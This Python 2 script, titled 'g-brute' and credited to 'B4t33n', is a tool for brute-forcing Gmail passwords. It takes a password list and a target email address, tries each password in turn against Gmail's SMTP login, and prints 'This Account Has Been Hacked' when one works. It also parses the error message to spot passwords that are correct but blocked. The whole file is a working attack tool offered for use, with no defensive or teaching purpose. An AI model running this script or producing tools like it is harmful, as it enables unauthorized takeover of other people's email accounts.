# -*- coding: utf-8 -*-
#!/usr/bin/python
'''create by B4t33n'''
import os
import smtplib
from os import system
os.system('clear')
print('\033[92m')
def main():
  
  
   print('                  _                _        ')
   print('       __ _      | |__  _ __ _   _| |_ ___  ')
   print('      / _` |_____| |_ \| |__| | | | __/ _ \ ')
   print('     | (_| |_____| |_) | |  | |_| | ||  __/ ')
   print('      \__, |     |_.__/|_|   \__,_|\__\___| ')
   print('      |___/                                v.1.0')
   print '\n'
   print('\033[94m')
  
   print('=================================================')
   print( '                 create by B4t33n                 ')
   print( '=================================================')
   print('\033[91m')
   print('    FB Page : https://www.facebook.com/B4t33n/')
   print('      FB Group : Bangladesh What Hat Hackers')
   print('        Email : gamilniyakikorbu@gmail.com')
   print('\033[92m')
   print( '                ++++++++++++++++++++              ')
   print('')
main()
print('\033[93m')
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('enter of passwords file : ')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email : ')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print('\033[92m')
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print('\033[95m')
         print '\n'
         print '[+] This Account Has Been Hacked Password :        ==> ' + password + '     '
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()